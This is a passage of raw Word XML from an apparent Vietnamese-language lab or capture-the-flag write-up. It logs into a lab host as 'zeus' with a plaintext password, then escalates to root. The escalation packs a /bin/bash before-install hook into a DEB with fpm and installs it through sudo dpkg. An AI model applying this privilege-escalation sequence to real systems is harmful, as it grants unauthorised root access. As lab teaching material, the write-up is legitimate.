            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:sz w:val="22"/>
          </w:rPr>
          <w:t>zeus@192.168.56.119</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="411F7F9D" w14:textId="04AA4BA4" w:rsidR="000B050E" w:rsidRPr="000B050E" w:rsidRDefault="000B050E">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000B050E">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cetkKf4wCuHC9FET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62934CE3" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F99727" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Sau khi đăng nhập, sudo -l cho biết quyền liên quan đến dpkg, là cơ sở cho bước leo quyền.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26186A06" w14:textId="77A9EDF3" w:rsidR="00794677" w:rsidRDefault="00C02D1A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D1A8DF8" wp14:editId="184F079C">
            <wp:extent cx="6217920" cy="3056890"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="207285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56615" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3056890"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>6. Tạo gói DEB thực thi shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A82D31" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đóng gói một script /bin/bash vào gói DEB có hook before-install.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDA6F70" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F21633" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>apt-get install ruby ruby-dev rubygems build-essential</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334A5568" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>gem install fpm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BB3712" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>vi privesc.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3C8189" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E422FFF" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>fpm -s dir -t deb -n privesc --before-install privesc.sh .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C383191" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>FPM tạo gói DEB và cấu hình privesc.sh chạy trước quá trình cài đặt. Script chứa /bin/bash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EE14C4" w14:textId="77777777" w:rsidR="00C02D1A" w:rsidRDefault="00C02D1A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E490714" wp14:editId="72A15963">
            <wp:extent cx="3076575" cy="1295400"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="42196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64773" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3076575" cy="1295400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB036FB" w14:textId="7C2CF521" w:rsidR="000B050E" w:rsidRPr="000B050E" w:rsidRDefault="000B050E" w:rsidP="000B050E">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="63C4EE52" wp14:editId="150B9D7A">
            <wp:extent cx="6217920" cy="982345"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="147519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90586" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="982345"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D53D1C" w14:textId="58AC455E" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>7. Chuyển gói và cài đặt bằng sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5096231A" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đưa gói DEB sang máy mục tiêu và kích hoạt hook bằng dpkg.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACD84AC" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2967875D" w14:textId="5C98FD4D" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">scp privesc_1.0_amd64.deb </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:history="1">
        <w:r w:rsidR="000B050E" w:rsidRPr="00573E6B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:sz w:val="22"/>
          </w:rPr>
          <w:t>zeus@192.168.56.119:/home/zeus</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="08A9BB64" w14:textId="694779E7" w:rsidR="000B050E" w:rsidRPr="000B050E" w:rsidRDefault="000B050E">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000B050E">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cetkKf4wCuHC9FET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C0BC34" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sudo /usr/bin/dpkg -i privesc_1.0_amd64.deb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1400B9F6" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>SCP chuyển gói tới thư mục của zeus. Khi dpkg cài gói bằng sudo, script before-install được thực thi với quyền của tiến trình cài đặt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC040A0" w14:textId="7A628C4B" w:rsidR="00794677" w:rsidRDefault="000B050E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31AD2597" wp14:editId="55462804">
            <wp:extent cx="6217920" cy="3968115"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="166136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69289" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3968115"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397C032E" w14:textId="77777777" w:rsidR="00794677" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Quá trình thực hiện gồm dò quét web, kiểm tra tham số đọc tệp, truy vấn LDAP, đăng nhập SSH và lợi dụng quyền sudo đối với dpkg bằng một gói DEB tự tạo.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00794677"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256764">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="665939443">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="327177421">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="290015129">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="840388049">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="633757140">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1217929402">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="309484151">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="168528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50E"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="004B4059"/>
    <w:rsid w:val="00794677"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C02D1A"/>
    <w:rsid w:val="00C32E25"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00EA29FF"/>
    <w:rsid w:val="00FA79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C89B2"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{8B3D14AB-B9A1-4F79-90B6-E0FE5977B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b/>
      <w:bCs/>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="00FC693F"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="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B050E"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000B0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mailto:zeus@192.168.56.119"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mailto:zeus@192.168.56.119:/home/ze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10</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2026-07-26T09:53:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>